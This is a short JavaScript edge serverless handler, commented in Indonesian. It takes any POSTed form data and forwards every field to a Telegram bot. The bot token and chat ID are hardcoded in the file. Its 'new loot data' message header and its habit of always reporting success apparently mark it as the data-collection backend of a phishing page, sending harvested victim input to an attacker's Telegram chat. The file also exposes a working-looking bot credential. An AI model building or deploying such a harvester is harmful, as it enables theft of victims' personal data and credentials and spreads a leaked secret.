// Konfigurasi Token & Chat ID Langsung
const TELEGRAM_BOT_TOKEN = "8597331224:AAFnZ8fuiYeyUKVlypItH1Gutz23PCOMT6Y";
const CHAT_ID = "6604182176";

export const config = {
    runtime: 'edge',
};

export default async function handler(request) {
    // 1. Validasi Method (Hanya izinkan POST)
    if (request.method !== 'POST') {
        return new Response(JSON.stringify({ message: 'Method Not Allowed' }), {
            status: 405,
            headers: { 'Content-Type': 'application/json' },
        });
    }

    try {
        // 2. Ambil data JSON dari body request
        const data = await request.json(); 

        // 3. Format Pesan (Membersihkan data kosong & filter filename)
        let messageText = '📥 *DATA BONGKARAN BARU (EDGE)* 📥\n\n';
        
        for (const key in data) {
            const value = data[key];
            
            // Filter: Jangan kirim jika data kosong atau jika itu input file kosong {}
            if (!value || (typeof value === 'object' && Object.keys(value).length === 0)) {
                continue;
            }

            // Ubah key (id_pengirim -> ID PENGIRIM)
            const label = key.toUpperCase().replace(/_|\s/g, ' ');
            messageText += `*${label}*: \`${value}\` \n`;
        }
        
        // 4. Kirim ke API Telegram menggunakan Fetch
        const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const tgResponse = await fetch(telegramURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                parse_mode: 'Markdown'
            }),
        });

        const tgResult = await tgResponse.json();

        // 5. Respon Balik ke Browser
        if (tgResult.ok) {
            return new Response(JSON.stringify({ status: 'success', message: 'Terkirim ke Telegram' }), {
                status: 200,
                headers: { 'Content-Type': 'application/json' },
            });
        } else {
            throw new Error(tgResult.description);
        }

    } catch (error) {
        // Jika error, tetap berikan respon 200 agar frontend tidak macet, tapi infokan gagal
        console.error("Edge Error:", error.message);
        return new Response(JSON.stringify({ status: 'error', message: error.message }), {
            status: 200, 
            headers: { 'Content-Type': 'application/json' },
        });
    }
}
